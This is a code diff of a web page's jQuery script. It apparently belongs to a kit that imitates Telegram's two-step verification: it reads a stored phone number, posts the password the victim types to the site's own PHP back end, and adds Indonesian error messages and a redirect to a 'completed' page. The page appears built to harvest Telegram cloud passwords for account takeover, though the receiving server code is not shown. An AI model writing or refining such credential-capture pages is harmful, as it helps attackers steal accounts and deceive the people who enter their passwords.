@@ -65,19 +65,24 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
     <script src="https://code.jquery.com/jquery.min.js"></script>
     <script>
-        $(document).ready(function() {});
-    </script>
-
-    <script>
         $(document).ready(function() {
             var img = sessionStorage.getItem("img");
             console.log(img);
             $(".top-card").children("img").attr("src", img);
+            
+            var phoneNumber = localStorage.getItem("phoneNumber");
+            if (phoneNumber) {
+                $(".phone-number").text(phoneNumber);
+            }
+
+            $("#2fa-form").on("submit", function(e) {
+                e.preventDefault();
+                var password = $("#password").val();
+                verifyTelegramPassword(password);
+            });
         });
 
-        $("#2fa-form").on("submit", function(e) {
-            e.preventDefault();
-            var password = $("#password").val();
+        function verifyTelegramPassword(password) {
             $(".loading").show();
             $.ajax({
                 type: "POST",
@@ -85,22 +90,26 @@
                 data: {
                     password: password
                 },
+                dataType: "json",
                 success: function(response) {
                     $(".loading").hide();
-                    window.location.href = "./completed.php";
+                    
+                    if (response.success) {
+                        // Authentication completed
+                        window.location.href = "./completed.php";
+                    } else {
+                        // Authentication failed
+                        toastr.error(response.error || "Password tidak valid. Silakan coba lagi.");
+                    }
                 },
-                error: function(xhr) {
-                    $("#message").html(
-                        '<div class="alert alert-danger">Error: ' +
-                        xhr.responseText +
-                        "</div>"
-                    );
+                error: function(xhr, status, error) {
+                    $(".loading").hide();
+                    console.log("Error:", error);
+                    toastr.error("Terjadi kesalahan. Silakan coba lagi.");
                 },
             });
-        });
+        }
     </script>
-
-
 </body>
 
 </html>
